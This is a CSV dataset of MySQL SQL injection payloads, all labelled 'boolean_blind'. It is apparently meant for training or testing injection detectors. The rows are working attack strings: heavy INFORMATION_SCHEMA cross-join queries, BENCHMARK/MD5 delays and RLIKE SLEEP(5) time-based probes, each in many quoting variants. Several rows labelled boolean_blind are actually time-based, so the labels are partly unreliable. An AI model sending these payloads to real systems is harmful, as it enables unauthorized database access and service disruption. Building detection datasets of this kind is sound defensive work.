payload,label
"1'+(SELECT 0x6c717464 WHERE 5235=5235 AND 5326=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1||(SELECT 0x65564f4a FROM DUAL WHERE 5366=5366 AND 5326=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1||(SELECT 0x6a594276 WHERE 7557=7557 AND 5326=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1+(SELECT 0x51504c54 WHERE 2145=2145 AND 5326=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1')) AS fJkK WHERE 9803=9803 AND 5326=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1"")) AS ePjT WHERE 2169=2169 AND 5326=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1') AS vEva WHERE 9337=9337 AND 5326=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1"") AS tlhA WHERE 7893=7893 AND 5326=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1) OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1)) OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1))) OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1) WHERE 1560=1560 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1 WHERE 6440=6440 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1+(SELECT oasS WHERE 7110=7110 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1)) AS BGOv WHERE 8265=8265 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1) AS KsJQ WHERE 8418=8418 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1` WHERE 7278=7278 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1`) WHERE 9472=9472 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1') OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1' OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1"" OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1')) OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1'))) OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1%' OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1"") OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1"")) OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1""))) OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1') WHERE 3245=3245 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1"") WHERE 7768=7768 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1' WHERE 1454=1454 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1"" WHERE 1670=1670 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1'||(SELECT 0x6c677341 WHERE 9328=9328 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1'||(SELECT 0x4a757478 FROM DUAL WHERE 1737=1737 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1'+(SELECT 0x6e647541 WHERE 8726=8726 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1||(SELECT 0x4851796a FROM DUAL WHERE 6653=6653 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1||(SELECT 0x4d4c7062 WHERE 8096=8096 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1+(SELECT 0x6d4c5747 WHERE 9546=9546 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1')) AS twVK WHERE 3546=3546 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1"")) AS rfUq WHERE 4488=4488 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1') AS aoqO WHERE 5517=5517 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1"") AS kptI WHERE 2422=2422 OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1' IN BOOLEAN MODE) OR 8738=BENCHMARK(5000000,MD5(0x76766450))#",boolean_blind
"1) OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1)) OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1))) OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1) WHERE 4018=4018 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1 WHERE 1790=1790 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1+(SELECT dwzm WHERE 8136=8136 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1)) AS uYzM WHERE 8201=8201 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1) AS tpBt WHERE 2158=2158 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1` WHERE 1763=1763 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1`) WHERE 9036=9036 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1') OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1' OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1"" OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1')) OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1'))) OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1%' OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1"") OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1"")) OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1""))) OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1') WHERE 5891=5891 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1"") WHERE 4181=4181 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1' WHERE 1356=1356 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1"" WHERE 7583=7583 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1'||(SELECT 0x6849446d WHERE 9694=9694 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1'||(SELECT 0x54766162 FROM DUAL WHERE 1364=1364 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1'+(SELECT 0x526d4b71 WHERE 7824=7824 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1||(SELECT 0x59444e45 FROM DUAL WHERE 9750=9750 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1||(SELECT 0x5767544a WHERE 6483=6483 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1+(SELECT 0x54756b6a WHERE 8211=8211 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1')) AS Lzbs WHERE 7316=7316 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1"")) AS virU WHERE 9434=9434 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1') AS inWs WHERE 5487=5487 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
"1"") AS CchH WHERE 9251=9251 OR 5740=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C)#",boolean_blind
1) RLIKE SLEEP(5)-- hzMf,boolean_blind
1) RLIKE SLEEP(5) AND (8459=8459,boolean_blind
1)) RLIKE SLEEP(5) AND ((7946=7946,boolean_blind
1))) RLIKE SLEEP(5) AND (((8208=8208,boolean_blind
1 RLIKE SLEEP(5),boolean_blind
1 RLIKE SLEEP(5)-- AxqI,boolean_blind
1 RLIKE SLEEP(5)# CSFT,boolean_blind
1) WHERE 3744=3744 RLIKE SLEEP(5)-- nazO,boolean_blind
1 WHERE 9807=9807 RLIKE SLEEP(5)-- WIpw,boolean_blind
1+(SELECT uSKZ WHERE 1521=1521 RLIKE SLEEP(5))+,boolean_blind
1)) AS yuvd WHERE 2986=2986 RLIKE SLEEP(5)-- jQrz,boolean_blind
1) AS SAVm WHERE 4543=4543 RLIKE SLEEP(5)-- poci,boolean_blind
1` WHERE 9083=9083 RLIKE SLEEP(5)-- bWzu,boolean_blind
1`) WHERE 4436=4436 RLIKE SLEEP(5)-- FeKv,boolean_blind
1') RLIKE SLEEP(5)-- wmrd,boolean_blind
1' RLIKE SLEEP(5)-- Ywfa,boolean_blind
"1"" RLIKE SLEEP(5)-- dGQF",boolean_blind
1') RLIKE SLEEP(5) AND ('lOsL'='lOsL,boolean_blind
1')) RLIKE SLEEP(5) AND (('YWjK'='YWjK,boolean_blind
1'))) RLIKE SLEEP(5) AND ((('REaF'='REaF,boolean_blind
1' RLIKE SLEEP(5) AND 'zjEs'='zjEs,boolean_blind
1') RLIKE SLEEP(5) AND ('rlqW' LIKE 'rlqW,boolean_blind
1')) RLIKE SLEEP(5) AND (('pvzF' LIKE 'pvzF,boolean_blind
1'))) RLIKE SLEEP(5) AND ((('tBWp' LIKE 'tBWp,boolean_blind
1%' RLIKE SLEEP(5) AND 'oWib%'='oWib,boolean_blind
1' RLIKE SLEEP(5) AND 'NwJe' LIKE 'NwJe,boolean_blind
"1"") RLIKE SLEEP(5) AND (""DEiI""=""DEiI",boolean_blind
"1"")) RLIKE SLEEP(5) AND ((""ssLq""=""ssLq",boolean_blind
"1""))) RLIKE SLEEP(5) AND (((""tWhX""=""tWhX",boolean_blind
"1"" RLIKE SLEEP(5) AND ""Boyb""=""Boyb",boolean_blind
"1"") RLIKE SLEEP(5) AND (""Tzox"" LIKE ""Tzox",boolean_blind
"1"")) RLIKE SLEEP(5) AND ((""BdYf"" LIKE ""BdYf",boolean_blind
"1""))) RLIKE SLEEP(5) AND (((""dQWX"" LIKE ""dQWX",boolean_blind
"1"" RLIKE SLEEP(5) AND ""kJsa"" LIKE ""kJsa",boolean_blind
1' RLIKE SLEEP(5) OR 'QAlJ'='XuZK,boolean_blind
1') WHERE 6924=6924 RLIKE SLEEP(5)-- YKfc,boolean_blind
"1"") WHERE 9704=9704 RLIKE SLEEP(5)-- Iusu",boolean_blind
1' WHERE 7450=7450 RLIKE SLEEP(5)-- vRNG,boolean_blind
"1"" WHERE 1021=1021 RLIKE SLEEP(5)-- SvqI",boolean_blind
1'||(SELECT 0x6168754f WHERE 7947=7947 RLIKE SLEEP(5))||',boolean_blind
1'||(SELECT 0x506d7a68 FROM DUAL WHERE 8529=8529 RLIKE SLEEP(5))||',boolean_blind
1'+(SELECT 0x636e4f6a WHERE 8369=8369 RLIKE SLEEP(5))+',boolean_blind
1||(SELECT 0x66584c47 FROM DUAL WHERE 5133=5133 RLIKE SLEEP(5))||,boolean_blind
1||(SELECT 0x65786f4c WHERE 8724=8724 RLIKE SLEEP(5))||,boolean_blind
1+(SELECT 0x64675479 WHERE 9285=9285 RLIKE SLEEP(5))+,boolean_blind
1')) AS vIID WHERE 4188=4188 RLIKE SLEEP(5)-- dWcm,boolean_blind
"1"")) AS Kmiq WHERE 2284=2284 RLIKE SLEEP(5)-- QMWG",boolean_blind
1') AS WpeG WHERE 8045=8045 RLIKE SLEEP(5)-- tlga,boolean_blind
"1"") AS Trlx WHERE 5748=5748 RLIKE SLEEP(5)-- qJkM",boolean_blind
1' IN BOOLEAN MODE) RLIKE SLEEP(5)#,boolean_blind
1) RLIKE SLEEP(5)#,boolean_blind
1)) RLIKE SLEEP(5)#,boolean_blind
1))) RLIKE SLEEP(5)#,boolean_blind
1 RLIKE SLEEP(5)#,boolean_blind
1) WHERE 7346=7346 RLIKE SLEEP(5)#,boolean_blind
1 WHERE 1900=1900 RLIKE SLEEP(5)#,boolean_blind
1+(SELECT PClJ WHERE 8875=8875 RLIKE SLEEP(5)#,boolean_blind
1)) AS pFTL WHERE 2653=2653 RLIKE SLEEP(5)#,boolean_blind
1) AS TiXt WHERE 6379=6379 RLIKE SLEEP(5)#,boolean_blind
1` WHERE 9644=9644 RLIKE SLEEP(5)#,boolean_blind
1`) WHERE 2047=2047 RLIKE SLEEP(5)#,boolean_blind
1') RLIKE SLEEP(5)#,boolean_blind
1' RLIKE SLEEP(5)#,boolean_blind
"1"" RLIKE SLEEP(5)#",boolean_blind
1')) RLIKE SLEEP(5)#,boolean_blind
1'))) RLIKE SLEEP(5)#,boolean_blind
1%' RLIKE SLEEP(5)#,boolean_blind
"1"") RLIKE SLEEP(5)#",boolean_blind
"1"")) RLIKE SLEEP(5)#",boolean_blind
"1""))) RLIKE SLEEP(5)#",boolean_blind
1') WHERE 6475=6475 RLIKE SLEEP(5)#,boolean_blind
"1"") WHERE 4199=4199 RLIKE SLEEP(5)#",boolean_blind
1' WHERE 6589=6589 RLIKE SLEEP(5)#,boolean_blind
"1"" WHERE 3800=3800 RLIKE SLEEP(5)#",boolean_blind
1'||(SELECT 0x594c5557 WHERE 9463=9463 RLIKE SLEEP(5)#,boolean_blind
1'||(SELECT 0x636e506c FROM DUAL WHERE 5088=5088 RLIKE SLEEP(5)#,boolean_blind
1'+(SELECT 0x6d426e5a WHERE 2442=2442 RLIKE SLEEP(5)#,boolean_blind
1||(SELECT 0x44566f69 FROM DUAL WHERE 1336=1336 RLIKE SLEEP(5)#,boolean_blind
1||(SELECT 0x55704b73 WHERE 7530=7530 RLIKE SLEEP(5)#,boolean_blind
1+(SELECT 0x434e4f51 WHERE 2717=2717 RLIKE SLEEP(5)#,boolean_blind
1')) AS TvhP WHERE 2966=2966 RLIKE SLEEP(5)#,boolean_blind
"1"")) AS HYJP WHERE 9962=9962 RLIKE SLEEP(5)#",boolean_blind
1') AS YpaA WHERE 8419=8419 RLIKE SLEEP(5)#,boolean_blind
"1"") AS gzUU WHERE 5519=5519 RLIKE SLEEP(5)#",boolean_blind
1) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- WzUn,boolean_blind
1) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND (4667=4667,boolean_blind
1)) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND ((9132=9132,boolean_blind
1))) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND (((5620=5620,boolean_blind
1 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX),boolean_blind
1 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- wGsc,boolean_blind
1 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)# YuTr,boolean_blind
1) WHERE 2516=2516 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- AkjI,boolean_blind
1 WHERE 7580=7580 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- NRTI,boolean_blind
1+(SELECT LbXO WHERE 8418=8418 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX))+,boolean_blind
1)) AS lLiw WHERE 7036=7036 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- ZHvk,boolean_blind
1) AS DhhF WHERE 5123=5123 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- yxud,boolean_blind
1` WHERE 9359=9359 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- IdJH,boolean_blind
1`) WHERE 7227=7227 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- TEXs,boolean_blind
1') RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- nNyP,boolean_blind
1' RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- ejqJ,boolean_blind
"1"" RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- XWBH",boolean_blind
1') RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND ('WBAV'='WBAV,boolean_blind
1')) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND (('FIHk'='FIHk,boolean_blind
1'))) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND ((('gzmF'='gzmF,boolean_blind
1' RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND 'kiwc'='kiwc,boolean_blind
1') RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND ('xahM' LIKE 'xahM,boolean_blind
1')) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND (('Nrbw' LIKE 'Nrbw,boolean_blind
1'))) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND ((('crjR' LIKE 'crjR,boolean_blind
1%' RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND 'AfNk%'='AfNk,boolean_blind
1' RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND 'PXYk' LIKE 'PXYk,boolean_blind
"1"") RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND (""MwpW""=""MwpW",boolean_blind
"1"")) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND ((""sXMT""=""sXMT",boolean_blind
"1""))) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND (((""jgMP""=""jgMP",boolean_blind
"1"" RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND ""tDSi""=""tDSi",boolean_blind
"1"") RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND (""DTng"" LIKE ""DTng",boolean_blind
"1"")) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND ((""KNjE"" LIKE ""KNjE",boolean_blind
"1""))) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND (((""EMXV"" LIKE ""EMXV",boolean_blind
"1"" RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) AND ""pqtI"" LIKE ""pqtI",boolean_blind
1' RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX) OR 'Cijm'='jsgt,boolean_blind
1') WHERE 8971=8971 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- AFyK,boolean_blind
"1"") WHERE 7440=7440 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- EDNy",boolean_blind
1' WHERE 6383=6383 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- qywr,boolean_blind
"1"" WHERE 2859=2859 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- sImH",boolean_blind
1'||(SELECT 0x6b454b42 WHERE 1127=1127 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX))||',boolean_blind
1'||(SELECT 0x7177776b FROM DUAL WHERE 9167=9167 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX))||',boolean_blind
1'+(SELECT 0x51697743 WHERE 1912=1912 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX))+',boolean_blind
1||(SELECT 0x70515455 FROM DUAL WHERE 5211=5211 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX))||,boolean_blind
1||(SELECT 0x6745644e WHERE 3257=3257 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX))||,boolean_blind
1+(SELECT 0x69766b68 WHERE 2639=2639 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX))+,boolean_blind
1')) AS tQIo WHERE 1568=1568 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- rLis,boolean_blind
"1"")) AS qZJk WHERE 9125=9125 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- esDs",boolean_blind
1') AS ENhZ WHERE 2358=2358 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- Eoeg,boolean_blind
"1"") AS OvrE WHERE 9914=9914 RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)-- AROL",boolean_blind
1' IN BOOLEAN MODE) RLIKE (SELECT 8920 FROM (SELECT(SLEEP(5)))nsAX)#,boolean_blind
1) RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1)) RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1))) RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1 RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1) WHERE 4321=4321 RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1 WHERE 9221=9221 RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1+(SELECT vjvN WHERE 2136=2136 RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1)) AS ZtMZ WHERE 6159=6159 RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1) AS zolZ WHERE 8957=8957 RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1` WHERE 5690=5690 RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1`) WHERE 3985=3985 RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1') RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1' RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
"1"" RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#",boolean_blind
1')) RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1'))) RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
1%' RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#,boolean_blind
"1"") RLIKE (SELECT 6418 FROM (SELECT(SLEEP(5)))GTbe)#",boolean_blind
